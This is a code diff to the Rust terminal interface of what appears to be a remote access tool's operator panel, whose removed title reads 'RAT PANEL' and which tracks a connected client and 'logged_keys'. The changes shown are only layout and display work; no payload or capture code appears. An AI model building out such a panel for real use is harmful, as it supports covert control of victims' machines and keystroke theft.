@@ -8,8 +8,6 @@ use ratatui::style::{Color, Style, Modifier};
 use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Tabs};
 use ratatui::{DefaultTerminal, Frame};
 
-use crate::app::AppEvent::ClientConnected;
-
 use super::Core;
 
 pub enum AppEvent {
@@ -41,30 +39,31 @@ impl<'a> TabsState<'a> {
 }
 
 pub struct App<'a> {
-    _title: &'a str,
+    title: &'a str,
     input: String,
     tabs: TabsState<'a>,
     character_index: usize,
     messages: Vec<String>,
     instructions: Vec<String>,
+    client_addr: String,
     logged_keys: String,
     core: Core,
 }
 
 impl<'a> App<'a> {
-    pub fn new(_title: &'a str) -> Self {
+    pub fn new(title: &'a str) -> Self {
         Self {
-            _title,
+            title,
             input: String::new(),
-            tabs: TabsState::new(vec!["Client", "Log", "Impl"]),
+            tabs: TabsState::new(vec!["Client", "View", "Input"]),
             messages: Vec::new(),
             instructions: Vec::new(),
             character_index: 0,
+            client_addr: String::new(),
             logged_keys: String::new(),
             core: Core::new(),
         }
     }
-
 
     fn on_right(&mut self) {
         self.tabs.next();
@@ -130,14 +129,13 @@ impl<'a> App<'a> {
     pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
         terminal.draw(|frame| self.render(frame))?;
 
-        self.messages.push(format!("[*] waiting for client connection ..."));
-        self.core.start_terminal_key_events();
         self.core.start_tcp_listener();
+        self.core.start_terminal_key_events();
 
         while let Ok(event) = self.core.receiver.recv() {
             match event {
-                ClientConnected(stream, addr) => {
-                    self.messages.push(format!("[*] client is connected from {}", addr));
+                AppEvent::ClientConnected(stream, addr) => {
+                    self.client_addr = addr.to_string();
 
                     let mut stream_guard = self.core.stream.lock().unwrap();
                     *stream_guard = Some(stream);           
@@ -207,7 +205,7 @@ impl<'a> App<'a> {
                     .borders(Borders::ALL)
                     .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
                     .title(Span::styled(
-                        " ◈ RAT PANEL ",
+                        self.title,
                         Style::default()
                             .fg(Color::Rgb(0, 255, 200))
                             .add_modifier(Modifier::BOLD),
@@ -246,6 +244,58 @@ impl<'a> App<'a> {
     }
 
     fn draw_first_tab(&mut self, frame: &mut Frame, area: Rect) {
+        let chunks = Layout::vertical([
+            Constraint::Length(4),
+            Constraint::Length(1), 
+            Constraint::Fill(13),
+        ])
+        .split(area);
+
+        let client_block = Block::default()
+            .borders(Borders::ALL)
+            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
+            .title(Span::styled(
+                " ▸ CLIENT ",
+                Style::default()
+                    .fg(Color::Rgb(0, 200, 160))
+                    .add_modifier(Modifier::BOLD),
+            ))
+            .style(Style::default().bg(Color::Rgb(10, 10, 18)));
+
+        let client_lines = if !self.client_addr.is_empty() {
+            vec![
+                Line::from(Span::raw(" ")),
+                Line::from(vec![
+                    Span::styled("  client connected from   ", Style::default()
+                        .fg(Color::Rgb(50, 50, 80))),
+                    Span::styled(&self.client_addr, Style::default().fg(Color::Rgb(40, 40, 65))),
+                ]),
+            ]
+        } else {
+            vec![
+                Line::from(Span::raw(" ")),
+                Line::from(vec![
+                    Span::raw("  "),
+                    Span::styled(
+                        "  waiting for client ...  ",
+                        Style::default().fg(Color::Rgb(40, 40, 65)),
+                    ),
+                ]),
+            ]
+        };
+
+        let client = Paragraph::new(client_lines)
+            .block(client_block)
+            .style(Style::default().bg(Color::Rgb(10, 10, 18)));
+
+        frame.render_widget(client, chunks[0]);
+
+        let sep = Paragraph::new(Line::from(Span::styled(
+            "─".repeat(area.width as usize),
+            Style::default().fg(Color::Rgb(30, 30, 55)),
+        )));
+        frame.render_widget(sep, chunks[1]);
+
         let block = Block::default()
             .borders(Borders::ALL)
             .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
@@ -291,7 +341,7 @@ impl<'a> App<'a> {
             .block(block)
             .highlight_style(Style::default().bg(Color::Rgb(20, 30, 40)));
 
-        frame.render_widget(list, area);
+        frame.render_widget(list, chunks[2]);
     }
 
     fn draw_second_tab(&mut self, frame: &mut Frame, area: Rect) {
